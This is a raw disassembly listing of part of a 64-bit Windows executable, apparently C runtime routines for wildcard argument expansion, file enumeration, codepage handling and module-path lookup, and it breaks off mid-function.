   1400071dd:	33 c9                	xor    %ecx,%ecx
   1400071df:	e8 b4 f8 ff ff       	call   0x140006a98
   1400071e4:	cc                   	int3
   1400071e5:	cc                   	int3
   1400071e6:	cc                   	int3
   1400071e7:	cc                   	int3
   1400071e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400071ed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400071f2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400071f7:	57                   	push   %rdi
   1400071f8:	41 54                	push   %r12
   1400071fa:	41 55                	push   %r13
   1400071fc:	41 56                	push   %r14
   1400071fe:	41 57                	push   %r15
   140007200:	48 83 ec 30          	sub    $0x30,%rsp
   140007204:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140007208:	49 8b f1             	mov    %r9,%rsi
   14000720b:	33 ff                	xor    %edi,%edi
   14000720d:	4d 8b f0             	mov    %r8,%r14
   140007210:	4c 8b ea             	mov    %rdx,%r13
   140007213:	4c 8b e1             	mov    %rcx,%r12
   140007216:	48 ff c5             	inc    %rbp
   140007219:	40 38 3c 29          	cmp    %dil,(%rcx,%rbp,1)
   14000721d:	75 f7                	jne    0x140007216
   14000721f:	ba 01 00 00 00       	mov    $0x1,%edx
   140007224:	49 8b c6             	mov    %r14,%rax
   140007227:	48 03 ea             	add    %rdx,%rbp
   14000722a:	48 f7 d0             	not    %rax
   14000722d:	48 3b e8             	cmp    %rax,%rbp
   140007230:	76 20                	jbe    0x140007252
   140007232:	8d 42 0b             	lea    0xb(%rdx),%eax
   140007235:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000723a:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000723f:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140007244:	48 83 c4 30          	add    $0x30,%rsp
   140007248:	41 5f                	pop    %r15
   14000724a:	41 5e                	pop    %r14
   14000724c:	41 5d                	pop    %r13
   14000724e:	41 5c                	pop    %r12
   140007250:	5f                   	pop    %rdi
   140007251:	c3                   	ret
   140007252:	4d 8d 78 01          	lea    0x1(%r8),%r15
   140007256:	4c 03 fd             	add    %rbp,%r15
   140007259:	49 8b cf             	mov    %r15,%rcx
   14000725c:	e8 73 f9 ff ff       	call   0x140006bd4
   140007261:	48 8b d8             	mov    %rax,%rbx
   140007264:	4d 85 f6             	test   %r14,%r14
   140007267:	74 19                	je     0x140007282
   140007269:	4d 8b ce             	mov    %r14,%r9
   14000726c:	4d 8b c5             	mov    %r13,%r8
   14000726f:	49 8b d7             	mov    %r15,%rdx
   140007272:	48 8b c8             	mov    %rax,%rcx
   140007275:	e8 46 3f 00 00       	call   0x14000b1c0
   14000727a:	85 c0                	test   %eax,%eax
   14000727c:	0f 85 d5 00 00 00    	jne    0x140007357
   140007282:	4d 2b fe             	sub    %r14,%r15
   140007285:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   140007289:	49 8b d7             	mov    %r15,%rdx
   14000728c:	4c 8b cd             	mov    %rbp,%r9
   14000728f:	4d 8b c4             	mov    %r12,%r8
   140007292:	e8 29 3f 00 00       	call   0x14000b1c0
   140007297:	85 c0                	test   %eax,%eax
   140007299:	0f 85 b8 00 00 00    	jne    0x140007357
   14000729f:	4c 8b 76 10          	mov    0x10(%rsi),%r14
   1400072a3:	44 8d 78 08          	lea    0x8(%rax),%r15d
   1400072a7:	4c 39 76 08          	cmp    %r14,0x8(%rsi)
   1400072ab:	0f 85 8d 00 00 00    	jne    0x14000733e
   1400072b1:	48 39 3e             	cmp    %rdi,(%rsi)
   1400072b4:	75 2b                	jne    0x1400072e1
   1400072b6:	41 8b d7             	mov    %r15d,%edx
   1400072b9:	8d 48 04             	lea    0x4(%rax),%ecx
   1400072bc:	e8 13 f9 ff ff       	call   0x140006bd4
   1400072c1:	33 c9                	xor    %ecx,%ecx
   1400072c3:	48 89 06             	mov    %rax,(%rsi)
   1400072c6:	e8 81 f9 ff ff       	call   0x140006c4c
   1400072cb:	48 8b 06             	mov    (%rsi),%rax
   1400072ce:	48 85 c0             	test   %rax,%rax
   1400072d1:	74 42                	je     0x140007315
   1400072d3:	48 89 46 08          	mov    %rax,0x8(%rsi)
   1400072d7:	48 83 c0 20          	add    $0x20,%rax
   1400072db:	48 89 46 10          	mov    %rax,0x10(%rsi)
   1400072df:	eb 5d                	jmp    0x14000733e
   1400072e1:	4c 2b 36             	sub    (%rsi),%r14
   1400072e4:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400072eb:	ff ff 7f 
   1400072ee:	49 c1 fe 03          	sar    $0x3,%r14
   1400072f2:	4c 3b f0             	cmp    %rax,%r14
   1400072f5:	77 1e                	ja     0x140007315
   1400072f7:	48 8b 0e             	mov    (%rsi),%rcx
   1400072fa:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   1400072fe:	48 8b d5             	mov    %rbp,%rdx
   140007301:	4d 8b c7             	mov    %r15,%r8
   140007304:	e8 23 2e 00 00       	call   0x14000a12c
   140007309:	48 85 c0             	test   %rax,%rax
   14000730c:	75 16                	jne    0x140007324
   14000730e:	33 c9                	xor    %ecx,%ecx
   140007310:	e8 37 f9 ff ff       	call   0x140006c4c
   140007315:	48 8b cb             	mov    %rbx,%rcx
   140007318:	bf 0c 00 00 00       	mov    $0xc,%edi
   14000731d:	e8 2a f9 ff ff       	call   0x140006c4c
   140007322:	eb 25                	jmp    0x140007349
   140007324:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140007328:	48 89 06             	mov    %rax,(%rsi)
   14000732b:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   14000732f:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   140007333:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   140007337:	33 c9                	xor    %ecx,%ecx
   140007339:	e8 0e f9 ff ff       	call   0x140006c4c
   14000733e:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140007342:	48 89 19             	mov    %rbx,(%rcx)
   140007345:	4c 01 7e 08          	add    %r15,0x8(%rsi)
   140007349:	33 c9                	xor    %ecx,%ecx
   14000734b:	e8 fc f8 ff ff       	call   0x140006c4c
   140007350:	8b c7                	mov    %edi,%eax
   140007352:	e9 de fe ff ff       	jmp    0x140007235
   140007357:	45 33 c9             	xor    %r9d,%r9d
   14000735a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000735f:	45 33 c0             	xor    %r8d,%r8d
   140007362:	33 d2                	xor    %edx,%edx
   140007364:	33 c9                	xor    %ecx,%ecx
   140007366:	e8 2d f7 ff ff       	call   0x140006a98
   14000736b:	cc                   	int3
   14000736c:	40 55                	rex push %rbp
   14000736e:	53                   	push   %rbx
   14000736f:	56                   	push   %rsi
   140007370:	57                   	push   %rdi
   140007371:	41 54                	push   %r12
   140007373:	41 55                	push   %r13
   140007375:	41 56                	push   %r14
   140007377:	48 8d ac 24 c0 fd ff 	lea    -0x240(%rsp),%rbp
   14000737e:	ff 
   14000737f:	48 81 ec 40 03 00 00 	sub    $0x340,%rsp
   140007386:	48 8b 05 73 2c 01 00 	mov    0x12c73(%rip),%rax        # 0x14001a000
   14000738d:	48 33 c4             	xor    %rsp,%rax
   140007390:	48 89 85 30 02 00 00 	mov    %rax,0x230(%rbp)
   140007397:	4d 8b e0             	mov    %r8,%r12
   14000739a:	48 8b f9             	mov    %rcx,%rdi
   14000739d:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   1400073a4:	20 00 00 
   1400073a7:	48 3b d1             	cmp    %rcx,%rdx
   1400073aa:	74 22                	je     0x1400073ce
   1400073ac:	8a 02                	mov    (%rdx),%al
   1400073ae:	2c 2f                	sub    $0x2f,%al
   1400073b0:	3c 2d                	cmp    $0x2d,%al
   1400073b2:	77 0a                	ja     0x1400073be
   1400073b4:	48 0f be c0          	movsbq %al,%rax
   1400073b8:	48 0f a3 c3          	bt     %rax,%rbx
   1400073bc:	72 10                	jb     0x1400073ce
   1400073be:	48 8b cf             	mov    %rdi,%rcx
   1400073c1:	e8 52 43 00 00       	call   0x14000b718
   1400073c6:	48 8b d0             	mov    %rax,%rdx
   1400073c9:	48 3b c7             	cmp    %rdi,%rax
   1400073cc:	75 de                	jne    0x1400073ac
   1400073ce:	44 8a 02             	mov    (%rdx),%r8b
   1400073d1:	41 80 f8 3a          	cmp    $0x3a,%r8b
   1400073d5:	75 1e                	jne    0x1400073f5
   1400073d7:	48 8d 47 01          	lea    0x1(%rdi),%rax
   1400073db:	48 3b d0             	cmp    %rax,%rdx
   1400073de:	74 15                	je     0x1400073f5
   1400073e0:	4d 8b cc             	mov    %r12,%r9
   1400073e3:	45 33 c0             	xor    %r8d,%r8d
   1400073e6:	33 d2                	xor    %edx,%edx
   1400073e8:	48 8b cf             	mov    %rdi,%rcx
   1400073eb:	e8 f8 fd ff ff       	call   0x1400071e8
   1400073f0:	e9 a3 02 00 00       	jmp    0x140007698
   1400073f5:	41 80 e8 2f          	sub    $0x2f,%r8b
   1400073f9:	45 33 f6             	xor    %r14d,%r14d
   1400073fc:	41 80 f8 2d          	cmp    $0x2d,%r8b
   140007400:	77 0c                	ja     0x14000740e
   140007402:	49 0f be c0          	movsbq %r8b,%rax
   140007406:	48 0f a3 c3          	bt     %rax,%rbx
   14000740a:	b0 01                	mov    $0x1,%al
   14000740c:	72 03                	jb     0x140007411
   14000740e:	41 8a c6             	mov    %r14b,%al
   140007411:	48 2b d7             	sub    %rdi,%rdx
   140007414:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140007419:	48 ff c2             	inc    %rdx
   14000741c:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140007421:	f6 d8                	neg    %al
   140007423:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140007428:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000742d:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140007432:	4d 1b ed             	sbb    %r13,%r13
   140007435:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
   14000743a:	4c 23 ea             	and    %rdx,%r13
   14000743d:	44 88 74 24 68       	mov    %r14b,0x68(%rsp)
   140007442:	33 d2                	xor    %edx,%edx
   140007444:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   140007449:	e8 6e 02 00 00       	call   0x1400076bc
   14000744e:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140007453:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140007458:	39 48 0c             	cmp    %ecx,0xc(%rax)
   14000745b:	75 17                	jne    0x140007474
   14000745d:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   140007461:	74 0c                	je     0x14000746f
   140007463:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140007468:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000746f:	44 8b c9             	mov    %ecx,%r9d
   140007472:	eb 38                	jmp    0x1400074ac
   140007474:	e8 3f 29 00 00       	call   0x140009db8
   140007479:	85 c0                	test   %eax,%eax
   14000747b:	75 1a                	jne    0x140007497
   14000747d:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   140007481:	74 0c                	je     0x14000748f
   140007483:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140007488:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000748f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140007495:	eb 15                	jmp    0x1400074ac
   140007497:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   14000749b:	74 0c                	je     0x1400074a9
   14000749d:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400074a2:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400074a9:	45 8b ce             	mov    %r14d,%r9d
   1400074ac:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400074b1:	48 8b cf             	mov    %rdi,%rcx
   1400074b4:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400074b9:	e8 de f7 ff ff       	call   0x140006c9c
   1400074be:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400074c3:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400074c7:	85 c0                	test   %eax,%eax
   1400074c9:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400074ce:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400074d3:	49 0f 45 ce          	cmovne %r14,%rcx
   1400074d7:	45 33 c9             	xor    %r9d,%r9d
   1400074da:	33 d2                	xor    %edx,%edx
   1400074dc:	ff 15 c6 8c 00 00    	call   *0x8cc6(%rip)        # 0x1400101a8
   1400074e2:	48 8b d8             	mov    %rax,%rbx
   1400074e5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400074e9:	75 2a                	jne    0x140007515
   1400074eb:	4d 8b cc             	mov    %r12,%r9
   1400074ee:	45 33 c0             	xor    %r8d,%r8d
   1400074f1:	33 d2                	xor    %edx,%edx
   1400074f3:	48 8b cf             	mov    %rdi,%rcx
   1400074f6:	e8 ed fc ff ff       	call   0x1400071e8
   1400074fb:	8b d8                	mov    %eax,%ebx
   1400074fd:	44 38 74 24 68       	cmp    %r14b,0x68(%rsp)
   140007502:	74 0a                	je     0x14000750e
   140007504:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140007509:	e8 3e f7 ff ff       	call   0x140006c4c
   14000750e:	8b c3                	mov    %ebx,%eax
   140007510:	e9 83 01 00 00       	jmp    0x140007698
   140007515:	49 8b 74 24 08       	mov    0x8(%r12),%rsi
   14000751a:	49 2b 34 24          	sub    (%r12),%rsi
   14000751e:	48 c1 fe 03          	sar    $0x3,%rsi
   140007522:	33 d2                	xor    %edx,%edx
   140007524:	4c 89 75 b0          	mov    %r14,-0x50(%rbp)
   140007528:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000752c:	4c 89 75 b8          	mov    %r14,-0x48(%rbp)
   140007530:	4c 89 75 c0          	mov    %r14,-0x40(%rbp)
   140007534:	4c 89 75 c8          	mov    %r14,-0x38(%rbp)
   140007538:	4c 89 75 d0          	mov    %r14,-0x30(%rbp)
   14000753c:	44 88 75 d8          	mov    %r14b,-0x28(%rbp)
   140007540:	e8 77 01 00 00       	call   0x1400076bc
   140007545:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   140007549:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000754e:	39 48 0c             	cmp    %ecx,0xc(%rax)
   140007551:	75 16                	jne    0x140007569
   140007553:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   140007557:	74 0b                	je     0x140007564
   140007559:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000755d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007564:	44 8b c9             	mov    %ecx,%r9d
   140007567:	eb 36                	jmp    0x14000759f
   140007569:	e8 4a 28 00 00       	call   0x140009db8
   14000756e:	85 c0                	test   %eax,%eax
   140007570:	75 19                	jne    0x14000758b
   140007572:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   140007576:	74 0b                	je     0x140007583
   140007578:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000757c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007583:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140007589:	eb 14                	jmp    0x14000759f
   14000758b:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   14000758f:	74 0b                	je     0x14000759c
   140007591:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140007595:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000759c:	45 8b ce             	mov    %r14d,%r9d
   14000759f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400075a4:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   1400075a8:	48 8d 4d 0c          	lea    0xc(%rbp),%rcx
   1400075ac:	e8 67 f8 ff ff       	call   0x140006e18
   1400075b1:	4c 8b 75 c0          	mov    -0x40(%rbp),%r14
   1400075b5:	33 d2                	xor    %edx,%edx
   1400075b7:	85 c0                	test   %eax,%eax
   1400075b9:	49 8b ce             	mov    %r14,%rcx
   1400075bc:	48 0f 45 ca          	cmovne %rdx,%rcx
   1400075c0:	80 39 2e             	cmpb   $0x2e,(%rcx)
   1400075c3:	75 1f                	jne    0x1400075e4
   1400075c5:	8a 41 01             	mov    0x1(%rcx),%al
   1400075c8:	84 c0                	test   %al,%al
   1400075ca:	75 0f                	jne    0x1400075db
   1400075cc:	38 55 d8             	cmp    %dl,-0x28(%rbp)
   1400075cf:	74 3a                	je     0x14000760b
   1400075d1:	49 8b ce             	mov    %r14,%rcx
   1400075d4:	e8 73 f6 ff ff       	call   0x140006c4c
   1400075d9:	eb 30                	jmp    0x14000760b
   1400075db:	3c 2e                	cmp    $0x2e,%al
   1400075dd:	75 05                	jne    0x1400075e4
   1400075df:	38 51 02             	cmp    %dl,0x2(%rcx)
   1400075e2:	74 e8                	je     0x1400075cc
   1400075e4:	4d 8b cc             	mov    %r12,%r9
   1400075e7:	4d 8b c5             	mov    %r13,%r8
   1400075ea:	48 8b d7             	mov    %rdi,%rdx
   1400075ed:	e8 f6 fb ff ff       	call   0x1400071e8
   1400075f2:	44 8b e8             	mov    %eax,%r13d
   1400075f5:	85 c0                	test   %eax,%eax
   1400075f7:	75 74                	jne    0x14000766d
   1400075f9:	38 45 d8             	cmp    %al,-0x28(%rbp)
   1400075fc:	74 08                	je     0x140007606
   1400075fe:	49 8b ce             	mov    %r14,%rcx
   140007601:	e8 46 f6 ff ff       	call   0x140006c4c
   140007606:	4c 8b 6c 24 38       	mov    0x38(%rsp),%r13
   14000760b:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000760f:	48 8b cb             	mov    %rbx,%rcx
   140007612:	ff 15 98 8b 00 00    	call   *0x8b98(%rip)        # 0x1400101b0
   140007618:	45 33 f6             	xor    %r14d,%r14d
   14000761b:	85 c0                	test   %eax,%eax
   14000761d:	0f 85 ff fe ff ff    	jne    0x140007522
   140007623:	49 8b 04 24          	mov    (%r12),%rax
   140007627:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   14000762c:	48 2b d0             	sub    %rax,%rdx
   14000762f:	48 c1 fa 03          	sar    $0x3,%rdx
   140007633:	48 3b f2             	cmp    %rdx,%rsi
   140007636:	74 17                	je     0x14000764f
   140007638:	48 2b d6             	sub    %rsi,%rdx
   14000763b:	48 8d 0c f0          	lea    (%rax,%rsi,8),%rcx
   14000763f:	4c 8d 0d 42 f6 ff ff 	lea    -0x9be(%rip),%r9        # 0x140006c88
   140007646:	45 8d 46 08          	lea    0x8(%r14),%r8d
   14000764a:	e8 61 37 00 00       	call   0x14000adb0
   14000764f:	48 8b cb             	mov    %rbx,%rcx
   140007652:	ff 15 48 8b 00 00    	call   *0x8b48(%rip)        # 0x1400101a0
   140007658:	44 38 74 24 68       	cmp    %r14b,0x68(%rsp)
   14000765d:	74 0a                	je     0x140007669
   14000765f:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140007664:	e8 e3 f5 ff ff       	call   0x140006c4c
   140007669:	33 c0                	xor    %eax,%eax
   14000766b:	eb 2b                	jmp    0x140007698
   14000766d:	80 7d d8 00          	cmpb   $0x0,-0x28(%rbp)
   140007671:	74 08                	je     0x14000767b
   140007673:	49 8b ce             	mov    %r14,%rcx
   140007676:	e8 d1 f5 ff ff       	call   0x140006c4c
   14000767b:	48 8b cb             	mov    %rbx,%rcx
   14000767e:	ff 15 1c 8b 00 00    	call   *0x8b1c(%rip)        # 0x1400101a0
   140007684:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   140007689:	74 0a                	je     0x140007695
   14000768b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140007690:	e8 b7 f5 ff ff       	call   0x140006c4c
   140007695:	41 8b c5             	mov    %r13d,%eax
   140007698:	48 8b 8d 30 02 00 00 	mov    0x230(%rbp),%rcx
   14000769f:	48 33 cc             	xor    %rsp,%rcx
   1400076a2:	e8 b9 9c ff ff       	call   0x140001360
   1400076a7:	48 81 c4 40 03 00 00 	add    $0x340,%rsp
   1400076ae:	41 5e                	pop    %r14
   1400076b0:	41 5d                	pop    %r13
   1400076b2:	41 5c                	pop    %r12
   1400076b4:	5f                   	pop    %rdi
   1400076b5:	5e                   	pop    %rsi
   1400076b6:	5b                   	pop    %rbx
   1400076b7:	5d                   	pop    %rbp
   1400076b8:	c3                   	ret
   1400076b9:	cc                   	int3
   1400076ba:	cc                   	int3
   1400076bb:	cc                   	int3
   1400076bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400076c1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400076c6:	57                   	push   %rdi
   1400076c7:	48 83 ec 20          	sub    $0x20,%rsp
   1400076cb:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   1400076cf:	48 8b f9             	mov    %rcx,%rdi
   1400076d2:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   1400076d6:	48 85 d2             	test   %rdx,%rdx
   1400076d9:	74 05                	je     0x1400076e0
   1400076db:	0f 10 02             	movups (%rdx),%xmm0
   1400076de:	eb 10                	jmp    0x1400076f0
   1400076e0:	83 3d 99 3c 01 00 00 	cmpl   $0x0,0x13c99(%rip)        # 0x14001b380
   1400076e7:	75 0d                	jne    0x1400076f6
   1400076e9:	0f 10 05 48 30 01 00 	movups 0x13048(%rip),%xmm0        # 0x14001a738
   1400076f0:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400076f4:	eb 4e                	jmp    0x140007744
   1400076f6:	e8 99 ec ff ff       	call   0x140006394
   1400076fb:	48 89 07             	mov    %rax,(%rdi)
   1400076fe:	48 8b d6             	mov    %rsi,%rdx
   140007701:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140007708:	48 89 0e             	mov    %rcx,(%rsi)
   14000770b:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140007712:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140007716:	48 8b c8             	mov    %rax,%rcx
   140007719:	e8 1a 34 00 00       	call   0x14000ab38
   14000771e:	48 8b 0f             	mov    (%rdi),%rcx
   140007721:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140007725:	e8 7a 34 00 00       	call   0x14000aba4
   14000772a:	48 8b 0f             	mov    (%rdi),%rcx
   14000772d:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140007733:	a8 02                	test   $0x2,%al
   140007735:	75 0d                	jne    0x140007744
   140007737:	83 c8 02             	or     $0x2,%eax
   14000773a:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140007740:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140007744:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007749:	48 8b c7             	mov    %rdi,%rax
   14000774c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007751:	48 83 c4 20          	add    $0x20,%rsp
   140007755:	5f                   	pop    %rdi
   140007756:	c3                   	ret
   140007757:	cc                   	int3
   140007758:	e9 47 f8 ff ff       	jmp    0x140006fa4
   14000775d:	cc                   	int3
   14000775e:	cc                   	int3
   14000775f:	cc                   	int3
   140007760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007765:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000776a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000776f:	57                   	push   %rdi
   140007770:	48 83 ec 40          	sub    $0x40,%rsp
   140007774:	33 ed                	xor    %ebp,%ebp
   140007776:	41 8b f1             	mov    %r9d,%esi
   140007779:	48 8b da             	mov    %rdx,%rbx
   14000777c:	48 8b f9             	mov    %rcx,%rdi
   14000777f:	48 85 c9             	test   %rcx,%rcx
   140007782:	75 1b                	jne    0x14000779f
   140007784:	40 38 6a 28          	cmp    %bpl,0x28(%rdx)
   140007788:	74 04                	je     0x14000778e
   14000778a:	40 88 6a 28          	mov    %bpl,0x28(%rdx)
   14000778e:	48 89 6a 10          	mov    %rbp,0x10(%rdx)
   140007792:	48 89 6a 18          	mov    %rbp,0x18(%rdx)
   140007796:	48 89 6a 20          	mov    %rbp,0x20(%rdx)
   14000779a:	e9 c3 00 00 00       	jmp    0x140007862
   14000779f:	66 39 29             	cmp    %bp,(%rcx)
   1400077a2:	75 34                	jne    0x1400077d8
   1400077a4:	48 39 6a 18          	cmp    %rbp,0x18(%rdx)
   1400077a8:	75 25                	jne    0x1400077cf
   1400077aa:	40 38 6a 28          	cmp    %bpl,0x28(%rdx)
   1400077ae:	74 04                	je     0x1400077b4
   1400077b0:	40 88 6a 28          	mov    %bpl,0x28(%rdx)
   1400077b4:	e8 fb f3 ff ff       	call   0x140006bb4
   1400077b9:	b9 22 00 00 00       	mov    $0x22,%ecx
   1400077be:	89 08                	mov    %ecx,(%rax)
   1400077c0:	8b c1                	mov    %ecx,%eax
   1400077c2:	40 88 6b 28          	mov    %bpl,0x28(%rbx)
   1400077c6:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   1400077ca:	e9 95 00 00 00       	jmp    0x140007864
   1400077cf:	48 8b 42 10          	mov    0x10(%rdx),%rax
   1400077d3:	40 88 28             	mov    %bpl,(%rax)
   1400077d6:	eb be                	jmp    0x140007796
   1400077d8:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   1400077dd:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400077e1:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400077e6:	4c 8b c7             	mov    %rdi,%r8
   1400077e9:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   1400077ed:	33 d2                	xor    %edx,%edx
   1400077ef:	8b ce                	mov    %esi,%ecx
   1400077f1:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400077f6:	e8 f1 0d 00 00       	call   0x1400085ec
   1400077fb:	48 63 d0             	movslq %eax,%rdx
   1400077fe:	85 c0                	test   %eax,%eax
   140007800:	75 16                	jne    0x140007818
   140007802:	ff 15 d0 88 00 00    	call   *0x88d0(%rip)        # 0x1400100d8
   140007808:	8b c8                	mov    %eax,%ecx
   14000780a:	e8 19 f3 ff ff       	call   0x140006b28
   14000780f:	e8 a0 f3 ff ff       	call   0x140006bb4
   140007814:	8b 00                	mov    (%rax),%eax
   140007816:	eb 4c                	jmp    0x140007864
   140007818:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000781c:	48 3b d1             	cmp    %rcx,%rdx
   14000781f:	76 0c                	jbe    0x14000782d
   140007821:	40 38 6b 28          	cmp    %bpl,0x28(%rbx)
   140007825:	74 8d                	je     0x1400077b4
   140007827:	40 88 6b 28          	mov    %bpl,0x28(%rbx)
   14000782b:	eb 87                	jmp    0x1400077b4
   14000782d:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140007831:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007835:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   14000783a:	4c 8b c7             	mov    %rdi,%r8
   14000783d:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140007842:	33 d2                	xor    %edx,%edx
   140007844:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140007848:	8b ce                	mov    %esi,%ecx
   14000784a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000784f:	e8 98 0d 00 00       	call   0x1400085ec
   140007854:	48 98                	cltq
   140007856:	48 85 c0             	test   %rax,%rax
   140007859:	74 a7                	je     0x140007802
   14000785b:	48 ff c8             	dec    %rax
   14000785e:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140007862:	33 c0                	xor    %eax,%eax
   140007864:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007869:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000786e:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007873:	48 83 c4 40          	add    $0x40,%rsp
   140007877:	5f                   	pop    %rdi
   140007878:	c3                   	ret
   140007879:	cc                   	int3
   14000787a:	cc                   	int3
   14000787b:	cc                   	int3
   14000787c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007881:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007886:	55                   	push   %rbp
   140007887:	48 8d ac 24 60 fe ff 	lea    -0x1a0(%rsp),%rbp
   14000788e:	ff 
   14000788f:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   140007896:	48 8b 05 63 27 01 00 	mov    0x12763(%rip),%rax        # 0x14001a000
   14000789d:	48 33 c4             	xor    %rsp,%rax
   1400078a0:	48 89 85 90 01 00 00 	mov    %rax,0x190(%rbp)
   1400078a7:	41 8b f8             	mov    %r8d,%edi
   1400078aa:	48 8b da             	mov    %rdx,%rbx
   1400078ad:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   1400078b3:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400078b7:	ff 15 ab 88 00 00    	call   *0x88ab(%rip)        # 0x140010168
   1400078bd:	85 c0                	test   %eax,%eax
   1400078bf:	75 14                	jne    0x1400078d5
   1400078c1:	ff 15 11 88 00 00    	call   *0x8811(%rip)        # 0x1400100d8
   1400078c7:	8b c8                	mov    %eax,%ecx
   1400078c9:	e8 5a f2 ff ff       	call   0x140006b28
   1400078ce:	33 c0                	xor    %eax,%eax
   1400078d0:	e9 a4 00 00 00       	jmp    0x140007979
